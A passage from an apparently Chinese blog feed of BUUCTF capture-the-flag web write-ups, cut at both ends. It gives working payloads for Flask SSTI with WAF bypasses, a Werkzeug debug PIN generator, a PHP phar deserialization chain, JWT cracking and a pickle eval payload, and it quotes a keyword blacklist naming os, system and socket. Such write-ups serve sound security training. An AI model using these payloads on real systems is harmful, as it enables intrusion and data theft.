class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$j</span></span> <span class="token interpolation"><span class="token variable">$j</span></span> 0 <span class="token interpolation"><span class="token variable">$len2</span></span> "</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p>然后使用<a href="https://github.com/openwall/php_mt_seed"><code>php_mt_seed</code></a>破解<br><img src="https://ftp.bmp.ovh/imgs/2021/03/95b8910573cb67a3.png"><br><img src="https://ftp.bmp.ovh/imgs/2021/03/2ac04e18e3d1300d.png"> </p><p>重新生成随机数：      </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'520423665'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token comment">//$str_show = substr($str, 0, 10);</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p id='p1'>"</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/p>"</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre></code></pre><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><a href="https://www.freebuf.com/vuls/192012.html">php mt_rand</a>   </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dropbox</title>
    <link href="/2021/03/21/BUU57/"/>
    <url>/2021/03/21/BUU57/</url>
    
    <content type="html"><![CDATA[<h2 id="好难"><a href="#好难" class="headerlink" title="好难"></a>好难</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/03/d3fb5b0878474c49.png"><br>试了一波SQL注入，感觉不行<br>注册—–登录—–上传个文件（这里上传文件也不行）<br><img src="https://ftp.bmp.ovh/imgs/2021/03/1f1922e979bb74c1.png"><br>下载—抓包<br>发现可以任意文件读取，记得要跳到上级目录<code>../../</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/8dbcc3256e9e1151.png"><br>最终将所有PHP文件读取出来，但不能直接读flag，被过了<br><img src="https://ftp.bmp.ovh/imgs/2021/03/78134ae933f2e358.png"><br>接下来就是代码审计了    </p><p><code>class.php</code>里      </p><pre><code>public function close() &#123;    return file_get_contents($this-&gt;filename);  public function __destruct() &#123;    $this-&gt;db-&gt;close();      </code></pre><p>但没有输出，也没有反序列化的地方<br>输出—&gt;filelist的destruct里有个echo      </p><p>phar(“Php Archive”)是PHP里的一种打包文件；其中的数据以序列化的形式保存。<br>phar文件结构：    </p><ol><li><p>stub  </p><p>  供phar扩展用于识别的标志，格式：<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>xxx随意，可以在前面使用文件头伪造图片等<code>GIF98a</code>       </p></li><li><p>manifest     </p><p> phar本质是一种压缩文件，每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的<code>meta-data</code>，这就是触发反序列化的点，当文件操作函数通过<code>phar://</code>伪协议解析phar文件时就会将数据反序列化。    </p></li><li><p>contents     </p><p> 内容        </p></li><li><p>signature      </p><p> 签名，放在文件末尾          </p></li></ol><p>所以可以将我们构造反序化脚本放入phar，生成phar文件，再用<code>phar://</code>反序列化       </p><p>pop链：<code>User-&gt;$db-&gt;FileList-&gt;$files-&gt;File</code>     </p><p>大佬的脚本：        </p><pre><code>```php&lt;?phpclass User &#123;    public $db;&#125;class File &#123;    public $filename;&#125;class FileList &#123;    private $files;    public function __construct() &#123;        $file = new File();        $file-&gt;filename = &quot;/flag.txt&quot;;        $this-&gt;files = array($file);    &#125;&#125;$a = new User();$a-&gt;db = new FileList();$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$o = new User();$o-&gt;db = new FileList();$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;```       </code></pre><p>运行后会生成个<code>phar.phar</code>文件<br>运行报错的话，要改一下<code>php.ini</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/dc7fa7ae8eec3de3.png"><br><code>phar.readonly</code>默认是开启的<br>将文件上传，改<code>Content-Type: image/gif</code><br>上传后删除此文件，抓包<br><img src="https://ftp.bmp.ovh/imgs/2021/03/8b004b7f88b8ad26.png">    </p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><a href="https://xz.aliyun.com/t/2715">phar</a>    </p><ul><li>利用条件：      </li><li>phar文件要能够上传到服务器端，<code>file_exists()</code>、<code>fopen()</code>、<code>file_get_contents()</code>、<code>file()</code>等文件操作的函数       </li><li>有可用的魔法函数作为“跳板”       </li><li>关键字符未被过滤<code>:</code>、<code>/</code>、<code>phar</code>       </li></ul><p><a href="https://www.jianshu.com/p/5b91e0b7f3ac">more</a><br><a href="https://blog.csdn.net/weixin_44077544/article/details/102844554">more</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU56</title>
    <link href="/2021/03/18/BUU56/"/>
    <url>/2021/03/18/BUU56/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[GYCTF2020]FlaskApp<br><img src="https://ftp.bmp.ovh/imgs/2021/03/9fd70301dbc831c0.png"> </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>SSTI<br><code>&#123;&#123;1+1&#125;&#125;</code>加密后解密返回2<br>直接用之前的payload打一下—–&gt;返回<code>nonono!</code><br>应该有过滤<br>报错的返回：<br><img src="https://ftp.bmp.ovh/imgs/2021/03/7415444900c60886.png"><br>说明开启了debug模式，而且可以看到文件的完整路径    </p><p><code>/usr/local/lib/python3.7/site-packages/flask/app.py</code><br>读一下文件<br><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><img src="https://ftp.bmp.ovh/imgs/2021/03/c46cda6028fdd98b.png"><br>可以看到有WAF     </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span> black_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token comment">#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token comment">#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token comment">#34;chr&amp;#34;,&amp;#34;request&amp;#34;</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token comment">#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token comment">#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token comment">#34;*&amp;#34;,&amp;#34;?&amp;#34;] </span><span class="token keyword">for</span> x <span class="token keyword">in</span> black_list <span class="token punctuation">:</span><span class="token keyword">if</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token number">1</span></code></pre></code></pre><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>一、<br>可以字符串拼接绕过<br> <code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><img src="https://ftp.bmp.ovh/imgs/2021/03/97db9f96462955ee.png"><br>打开<code>this_is_the_flag.txt</code>即可<br><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>      </p><p>二、<br>字符串倒转<code>[::-1]</code>         </p><pre><code>s=&quot;/this_is_the_flag.txt&quot;print(s[::-1])##结果：txt.galf_eht_si_siht/     </code></pre><p>payload：<code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>      </p><p>三、<br><img src="https://ftp.bmp.ovh/imgs/2021/03/a18776be9dbf759f.png">    </p><p>生成PIN的exp：      </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'flaskweb'</span><span class="token comment"># username</span>    <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># modname</span>    <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>    <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="token comment"># getattr(mod, '__file__', None),</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'2485377875088'</span><span class="token punctuation">,</span><span class="token comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>    <span class="token string">'5d9996326aaf665611dc77291ca91fc7e65f0429cfaec25692ea858467358a1c'</span><span class="token comment"># get_machine_id(), /etc/machine-id</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span></code></pre></code></pre><p><img src="https://ftp.bmp.ovh/imgs/2021/03/6cf573d94733f77f.png"><br>点击这个<br><img src="https://ftp.bmp.ovh/imgs/2021/03/0f34b27fdd395a9c.png"><br>填入生成的PIN码，即可进入python交互模式，然后在这里执行命令找flag即可<br><img src="https://ftp.bmp.ovh/imgs/2021/03/c7ba641e0112a209.png"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><a href="http://www.91ri.org/17362.html">Flask debug 模式 PIN 码生成机制安全性研究笔记</a><br><a href="https://zhuanlan.zhihu.com/p/32138231">Flask开启debug模式等于给黑客留了后门</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题</title>
    <link href="/2021/03/18/BUU055/"/>
    <url>/2021/03/18/BUU055/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[CISCN2019 华北赛区 Day1 Web2]ikun<br><img src="https://ftp.bmp.ovh/imgs/2021/03/447a0694ccac2a24.png">    </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>有提示<br>在下面点下一页的话，URL就变成了<code>http://c472e76d-638c-4834-ae42-125f0a073ed7.node3.buuoj.cn/shop?page=2</code><br>写个脚本找LV6    </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    url<span class="token operator">=</span><span class="token string">'http://fc76ee12-4b8a-4064-9eb3-84b2e8a5c4f9.node3.buuoj.cn/shop?page=&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'lv6.png'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre></code></pre><p>在181页<br>注册账号，购买，结算时抓包改<code>discount</code>—然后发包      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/03/010d17c39847ea49.png"><br>接下来要改<code>JWT</code>了<br><img src="https://ftp.bmp.ovh/imgs/2021/03/14d76e68917280b2.png">   </p><p>JWT由Header、Payload、Signature三部分组成，中间以圆点(.)连接<br>前两部分均以base64编码<br><code>Signature=HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)</code>        </p><p>JWT破解工具——-&gt;<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a><br>用法：需要先<a href="https://zhuanlan.zhihu.com/p/82361096">安装docker</a>;然后按照Github上的使用<br><img src="https://ftp.bmp.ovh/imgs/2021/03/b4eb75fe8f58961f.png"><br>然后在<a href="https://jwt.io/">这个网站</a>上生成新的JWT<br><img src="https://ftp.bmp.ovh/imgs/2021/03/2fcaed2eca6a14cc.png"><br>修改—发包<br>在源码中发现<br><img src="https://ftp.bmp.ovh/imgs/2021/03/8f5846239e5ea5ed.png"> </p><p>然后是<code>Admin.py</code>里Pickle反序列化<br><img src="https://ftp.bmp.ovh/imgs/2021/03/9badbf37f31eb602.png">   </p><p> <code>pickle.dump(obj,file,[,protocol])</code>   </p><pre><code>函数的功能：将obj对象序列化存入已经打开的file中。obj：想要序列化的obj对象。file:文件名称。protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</code></pre><p><code>pickle.load(file)</code>     </p><pre><code>函数的功能：将file中的对象序列化读出。file：文件名称。</code></pre><p><code>pickle.dumps(obj[,protocol])</code>     </p><pre><code>函数的功能：将obj对象序列化为string形式，而不是存入文件中。obj：想要序列化的obj对象。protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</code></pre><p><code>pickle.loads(string)</code>     </p><pre><code>函数的功能：从string中读出序列化前的obj对象。string：文件名称。【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码     </code></pre><p><a href="https://blog.csdn.net/satasun/article/details/109708593?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&spm=1001.2101.3001.4242">转自</a>   </p><p><code>__reduce__</code>魔法函数      </p><pre><code>  __reduce__ 被定义之后，当对象被Pickle时就会被调用。它要么    返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 __setstate__ 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）      </code></pre><p>上大佬的脚本：</p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">payload</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">###python3需要用下面的写法</span><span class="token comment">###a = pickle.dumps(payload(),protocol=0)</span>a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span> a    </code></pre></code></pre><p>python2下执行—<code>cposix%0Alistdir%0Ap0%0A%28S%27/%27%0Ap1%0Atp2%0ARp3%0A.</code><br>点击<code>一键成为大会员</code>,抓包改<code>become</code>—-发包<br><img src="https://ftp.bmp.ovh/imgs/2021/03/cde243001d7f40fe.png"><br>看到<code>flag.txt</code><br>return中改为<code>eval,(&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;)</code>打开<code>flag.txt</code>——-&gt;<code>c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/cdfd506f0aac1b38.png"><br>但用<code>os.system,(&#39;cat /flag.txt&#39;,)</code>不行？？？     </p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol><li><a href="https://www.cnblogs.com/cjsblog/p/9277677.html"><code>JWT</code></a> </li><li><a href="https://www.anquanke.com/post/id/188981">python反序列化</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题</title>
    <link href="/2021/03/16/BUU054/"/>
    <url>/2021/03/16/BUU054/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[MRCTF2020]Ezpop       </p><ul><li>PHP反序列化       </li><li>代码审计      </li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><pre><code><pre class="language-php" data-language="php"><code class="language-php">Welcome to index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag is in flag.php</span><span class="token comment">//WTF IS THIS?</span><span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><span class="token comment">//And Crack It!</span><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Welcome to '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre></code></pre><p>三个类<code>Modifier、Show、Test</code><br>三个魔法函数<code>__invoke、__toString、__get</code>      </p><ol><li><code>__invoke</code>:当尝试以调用函数的方式调用一个对象时，该方法会被自动调用;比如本题Test类中的<code>$function()</code>将$function等于一个实例化的类即可调用该函数。          